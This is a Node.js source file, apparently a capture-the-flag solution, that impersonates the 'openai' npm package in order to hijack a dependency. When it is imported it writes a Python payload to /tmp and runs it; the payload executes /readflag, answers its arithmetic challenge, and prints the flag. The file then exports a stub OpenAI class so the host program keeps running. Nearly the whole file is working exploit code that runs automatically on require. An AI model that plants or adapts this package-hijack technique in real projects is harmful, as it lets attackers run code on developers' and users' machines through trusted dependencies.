const { execSync, spawn } = require('child_process');
const fs = require('fs');

// 打印日志证明劫持成功
console.error("\n\n[EXPLOIT] Node.js Dependency Hijacked! (openai)\n\n");

// ================= 攻击载荷开始 =================
try {
    // 为了方便处理交互，我们还是用 Python 脚本来做数学题
    const pythonPayload = `
import os, sys, subprocess, re

def log(msg):
    sys.stderr.write(f"[EXPLOIT] {msg}\\n")

def pwn():
    target = "/readflag"
    if not os.path.exists(target):
        log("Target not found")
        return

    try:
        log("Running /readflag...")
        p = subprocess.Popen(
            [target], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True,
            bufsize=0
        )
        
        buffer = ""
        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            if "input your answer:" in buffer: break
        
        log(f"Question: {buffer}")
        match = re.search(r'(\d+)\\s*([+\\-*])\\s*(\d+)', buffer)
        
        if match:
            n1 = int(match.group(1))
            op = match.group(2)
            n2 = int(match.group(3))
            res = 0
            if op == '+': res = n1 + n2
            elif op == '-': res = n1 - n2
            elif op == '*': res = n1 * n2
            
            log(f"Answer: {res}")
            p.stdin.write(f"{res}\\n")
            p.stdin.flush()
            
            flag = p.stdout.read()
            print(f"\\n\\n[+] FLAG: {flag}\\n\\n", file=sys.stderr)
        else:
            log("Regex failed")
            
    except Exception as e:
        log(f"Error: {e}")

pwn()
`;

    // 写入临时文件
    fs.writeFileSync('/tmp/pwn_node.py', pythonPayload);

    // 执行 Python 脚本
    execSync('python3 /tmp/pwn_node.py', { stdio: 'inherit' });

} catch (e) {
    console.error("[EXPLOIT] Error executing payload: " + e.message);
}
// ================= 攻击载荷结束 =================

// 导出空对象，防止主程序因找不到方法而崩溃（虽然崩溃了也没事，Flag 已经拿到了）
module.exports = class OpenAI {
    constructor() {}
    createChatCompletion() { return Promise.resolve({}); }
};
